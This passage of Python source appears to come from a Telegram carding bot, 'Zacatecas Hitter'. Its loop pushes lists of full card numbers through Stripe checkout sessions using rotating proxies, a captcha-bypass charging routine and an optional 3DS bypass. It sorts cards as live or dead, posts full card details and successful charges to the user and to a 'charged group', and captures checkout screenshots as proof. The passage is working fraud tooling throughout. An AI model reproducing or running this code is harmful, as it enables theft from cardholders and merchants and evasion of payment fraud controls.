Merchant: {checkout_data['merchant'] or 'N/A'}
Processed: {i}/{len(cards)} cards
Status: CHECKOUT EXPIRED
Time: {round(time.perf_counter() - start_time, 2)}s
Used Proxies: {len(set(used_proxies))} unique

⚠️ Checkout link no longer active"""
                await msg.answer(format_html_pre(expired_msg), parse_mode="HTML")
                break
        
        # Charge card dengan NEW SESSION untuk setiap card
        result, captcha_blocked = await charge_card_with_captcha_bypass(
            card, checkout_data, current_proxy, bypass_3ds, 
            processing_msg=processing_msg,
            card_index=i+1,
            total_cards=len(cards)
        )
        results.append(result)
        
        # Track jika menggunakan bypass
        if result.get("approach") and "Bypass" in result.get("approach", ""):
            bypass_used_cards.append(i+1)
        
        # Analyze and send individual result DENGAN PROXY INFO
        card_parts = result['card'].split('|')
        full_card = f"{card_parts[0]}|{card_parts[1]}|{card_parts[2]}|{card_parts[3]}"
        response_lower = str(result.get('response', '')).lower()
        
        # Tambah info IP di setiap result
        ip_display = result.get('ip_address', proxy_ip)
        
        # HANDLE UNSUPPORTED SURFACE ERROR
        if result['status'] == 'ALL_APPROACHES_FAILED':
            error_msg = f"""🚫 ALL APPROACHES FAILED 🚫

Card: {full_card}
Status: COMPLETELY RESTRICTED
Response: Merchant has maximum security
IP: {ip_display}
Card: {i+1}/{len(cards)}

⚠️ This checkout cannot be processed
🔄 Try different checkout URL"""
            
            await msg.answer(format_html_pre(error_msg), parse_mode="HTML")
            unsupported_cards.append((full_card, "COMPLETELY_RESTRICTED", ip_display))
            continue
            
        elif result['status'] == 'UNSUPPORTED_SURFACE':
            error_msg = f"""❌ CHECKOUT RESTRICTED ❌

Card: {full_card}
Status: UNSUPPORTED
Response: Merchant restricted checkout
IP: {ip_display}
Card: {i+1}/{len(cards)}

⚠️ This checkout cannot be processed
🔄 Try different checkout URL"""
            
            await msg.answer(format_html_pre(error_msg), parse_mode="HTML")
            unsupported_cards.append((full_card, "UNSUPPORTED", ip_display))
            continue
            
        elif result['status'] == 'SESSION_EXPIRED':
            session_expired = True
            expired_msg = f"""⏳ SESSION EXPIRED ⏳

Merchant: {checkout_data['merchant'] or 'N/A'}
Processed: {i}/{len(cards)} cards
IP: {ip_display}
Status: CHECKOUT EXPIRED

⚠️ Checkout link no longer active"""
            
            await msg.answer(format_html_pre(expired_msg), parse_mode="HTML")
            break
        
        # HANDLE AUTH ERROR
        elif result['status'] == 'AUTH_ERROR':
            error_msg = f"""🔐 AUTHENTICATION ERROR 🔐

Card: {full_card}
Status: AUTH FAILED
Response: API key authentication error
IP: {ip_display}
Card: {i+1}/{len(cards)}

⚠️ Checkout requires secret key
🔄 Use different checkout URL"""
            
            await msg.answer(format_html_pre(error_msg), parse_mode="HTML")
            error_cards.append((full_card, "AUTH_ERROR", ip_display))
            continue
        
        if captcha_blocked and result['status'] == 'CAPTCHA_BLOCKED':
            captcha_blocked_msg = f"""🚫 CAPTCHA BLOCKED 🚫

Card: {full_card}
Status: CAPTCHA BLOCKED
Response: {result['response']}
Retries: {result['retry_count']}
Time: {result['time']}s
IP: {ip_display}
Card: {i+1}/{len(cards)}

⚠️ hCaptcha protection too strong
⏭️ Skipping to next card"""
            await msg.answer(format_html_pre(captcha_blocked_msg), parse_mode="HTML")
            captcha_blocked_cards.append((full_card, "CAPTCHA_BLOCKED", ip_display))
            continue
        
        # ========== RESPONSE BARU ==========
        
        if result['status'] == 'CHARGED':
            await send_charged_notification(card, checkout_data, msg)
            
            # ATTEMPT REAL SCREENSHOT
            cs_code = checkout_data.get('cs')
            if cs_code:
                try:
                    # Try to capture real checkout page
                    real_screenshot = await RealStripeScreenshot.capture_checkout_page(
                        cs_code=cs_code,
                        user_id=msg.from_user.id,
                        proxy_str=current_proxy
                    )
                    
                    if real_screenshot and os.path.exists(real_screenshot):
                        # Kirim REAL screenshot
                        photo = FSInputFile(real_screenshot)
                        caption = f"""📸 **REAL CHECKOUT PAGE CAPTURED** 🔥

✅ **Payment Successfully Charged!**
💳 Card: `{full_card}`
🏢 Merchant: {checkout_data.get('merchant', 'N/A')}
💰 Amount: {price_str}
🔐 Save Info: ✅ **CHECKBOX CHECKED**
📍 Real Page: checkout.stripe.com
⚡ **This is ACTUAL Stripe checkout page**"""
                        
                        await msg.answer_photo(
                            photo=photo,
                            caption=caption,
                            parse_mode="HTML"
                        )
                        
                        # Juga kirim ke charged group
                        try:
                            await msg.bot.send_photo(
                                chat_id=CHARGED_GROUP,
                                photo=photo,
                                caption=f"📸 Real Checkout Screenshot\nUser: {msg.from_user.id}\nMerchant: {checkout_data.get('merchant', 'N/A')}",
                                parse_mode="HTML"
                            )
                        except:
                            pass
                except Exception as e:
                    print(f"Real screenshot error: {e}")
            
            # Kirim CHARGED response baru
            msg_text = CHARGED_RESPONSE.format(
                card_index=i+1,
                total_cards=len(cards),
                full_card=full_card,
                merchant=checkout_data.get('merchant', 'N/A'),
                item=checkout_data.get('product', 'N/A'),
                amount=price_str,
                email=checkout_data.get('customer_email', 'N/A'),
                ip=ip_display
            )
            await msg.answer(msg_text, parse_mode="HTML")
            
            charged = True
            live_cards.append((full_card, "CHARGED", ip_display, result.get('approach', 'Standard')))
            break
            
        # CVV LIVE (INCORRECT CVC)
        elif "incorrect_cvc" in response_lower:
            msg_text = CVV_LIVE_RESPONSE.format(
                card_index=i+1,
                total_cards=len(cards),
                full_card=full_card,
                message=result['response'][:100],
                merchant=checkout_data.get('merchant', 'N/A'),
                item=checkout_data.get('product', 'N/A'),
                amount=price_str,
                ip=ip_display
            )
            await msg.answer(msg_text, parse_mode="HTML")
            
            live_cards.append((full_card, "INCORRECT_CVC", ip_display, result.get('approach', 'Standard')))
            incorrect_cvc_cards.append(full_card)
            
        # DECLINED DEAD
        elif result['status'] == 'DECLINED' and not any(x in response_lower for x in ["insufficient", "limit_exceeded", "do_not_honor"]):
            msg_text = DECLINED_DEAD_RESPONSE.format(
                card_index=i+1,
                total_cards=len(cards),
                full_card=full_card,
                message=result['response'][:100],
                code=result['status'],
                ip=ip_display
            )
            await msg.answer(msg_text, parse_mode="HTML")
            
            dead_cards.append((full_card, "DECLINED_DEAD", ip_display, result.get('approach', 'Standard')))
            
        # LIVE DECLINED (insufficient funds dll)
        elif result['status'] == 'DECLINED' and any(x in response_lower for x in ["insufficient", "limit_exceeded", "do_not_honor"]):
            msg_text = LIVE_DECLINED_RESPONSE.format(
                card_index=i+1,
                total_cards=len(cards),
                full_card=full_card,
                message=result['response'][:100],
                merchant=checkout_data.get('merchant', 'N/A'),
                amount=price_str,
                ip=ip_display
            )
            await msg.answer(msg_text, parse_mode="HTML")
            
            live_cards.append((full_card, "DECLINED_LIVE", ip_display, result.get('approach', 'Standard')))
            
        # 3DS REQUIRED
        elif result['status'] in ['3DS_REQUIRED', '3DS_SKIP']:
            msg_text = THREE_DS_RESPONSE.format(
                card_index=i+1,
                total_cards=len(cards),
                full_card=full_card,
                message=result['response'][:100],
                merchant=checkout_data.get('merchant', 'N/A'),
                amount=price_str,
                ip=ip_display
            )
            await msg.answer(msg_text, parse_mode="HTML")
            
            threeds_cards.append((full_card, "3DS", ip_display, result.get('approach', 'Standard')))
            live_cards.append((full_card, "3DS", ip_display, result.get('approach', 'Standard')))
            
        # PAYMENT EXPIRED
        elif result['status'] == 'SESSION_EXPIRED':
            msg_text = PAYMENT_EXPIRED_RESPONSE.format(
                card_index=i+1,
                total_cards=len(cards),
                full_card=full_card,
                message="Payment intent expired",
                code="SESSION_EXPIRED",
                ip=ip_display
            )
            await msg.answer(msg_text, parse_mode="HTML")
            
        # ERROR LAINNYA
        else:
            error_msg = f"""⚠️ ERROR ⚠️

Card: {full_card}
Status: {result['status']}
Response: {result['response']}
Time: {result['time']}s
IP: {ip_display}
Card: {i+1}/{len(cards)}"""
            await msg.answer(format_html_pre(error_msg), parse_mode="HTML")
            error_cards.append((full_card, "ERROR", ip_display, result.get('approach', 'Standard')))
        
        await asyncio.sleep(1)
    
    # FINAL SUMMARY
    total_time = round(time.perf_counter() - start_time, 2)
    
    if charged:
        final_msg = f"""🎯 CHARGING COMPLETED 🎯

Merchant: {checkout_data['merchant'] or 'N/A'}
Amount: {price_str}
Status: CHARGED SUCCESSFULLY ✅
Card Processed: {i+1}/{len(cards)}
Proxies Used: {len(set(used_proxies))} unique
Bypass Used: {'Yes' if bypass_used_cards else 'No'}
Total Time: {total_time}s

⚡ Immediate Stop - Card Charged
🔥 Keep using Zacatecas Hitter"""
        
    elif session_expired:
        final_msg = f"""⏳ SESSION TERMINATED ⏳

Merchant: {checkout_data['merchant'] or 'N/A'}
Cards Processed: {i}/{len(cards)}
Status: SESSION EXPIRED
Proxies Used: {len(set(used_proxies))} unique
Bypass Used: {'Yes' if bypass_used_cards else 'No'}
Total Time: {total_time}s

⚠️ Checkout link expired
🔄 Use fresh checkout URL"""
        
    else:
        # BATCH COMPLETE STATISTICS
        total_live = len(live_cards) + len(threeds_cards)
        total_dead = len(dead_cards)
        total_3ds = len(threeds_cards)
        total_error = len(error_cards) + len(captcha_blocked_cards)
        total_incorrect_cvc = len(incorrect_cvc_cards)
        total_unsupported = len(unsupported_cards)
        unique_proxies = len(set(used_proxies))
        bypass_cards_count = len(bypass_used_cards)
        
        final_msg = f"""📊 BATCH COMPLETE 📊

Merchant: {checkout_data['merchant'] or 'N/A'}
Amount: {price_str}
Proxies Used: {unique_proxies} unique
Cards Processed: {len(results)}/{len(cards)}
Bypass Used: {bypass_cards_count} cards

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚡ BATCH STATISTICS ⚡

Total Cards : {len(results)}
Live        : {total_live} ✅
Dead        : {total_dead} 💀
3DS         : {total_3ds} 🔐
Error       : {total_error} ⚠️
Unsupported : {total_unsupported} 🔒"""
        
        if total_incorrect_cvc > 0:
            final_msg += f"\nIncorrect CVC : {total_incorrect_cvc} 🔍"
        
        if len(captcha_blocked_cards) > 0:
            final_msg += f"\nCaptcha Blocked : {len(captcha_blocked_cards)} 🚫"
        
        if bypass_cards_count > 0:
            final_msg += f"\nBypass Used : {bypass_cards_count} cards 🔄"
        
        final_msg += f"""

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📈 Success Rate: {total_live}/{len(results)} LIVE cards
⏱️ Total Time: {total_time}s
🔚 Status: NO CHARGE

💡 LIVE Cards = Charged, Incorrect CVC, 3DS, Live Declines
💀 DEAD Cards = Invalid/Expired cards"""
        
        # Kirim detail LIVE cards jika ada
        if live_cards:
            live_detail = f"""🔍 LIVE CARDS DETAIL 🔍
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Unique Proxies Used: {len(set([ip for _, _, ip, _ in live_cards]))}
Bypass Used: {len([1 for _, _, _, approach in live_cards if 'Bypass' in str(approach)])} cards"""
            
            for idx, (card_mask, card_type, proxy_ip, approach) in enumerate(live_cards[:10], 1):
                icon = "✅" if card_type == "CHARGED" else "🔍" if card_type == "INCORRECT_CVC" else "🔐" if card_type == "3DS" else "⚠️"
                approach_text = f" [{approach}]" if approach and approach != "Standard" else ""
                live_detail += f"\n{icon} {idx}. {card_mask} - {card_type.replace('_', ' ')}{approach_text} | IP: {proxy_ip}"
            
            if len(live_cards) > 10:
                live_detail += f"\n... and {len(live_cards) - 10} more LIVE cards"
            
            await msg.answer(format_html_pre(live_detail), parse_mode="HTML")
    
    # Send final summary
    await processing_msg.edit_text(format_html_pre(final_msg), parse_mode="HTML")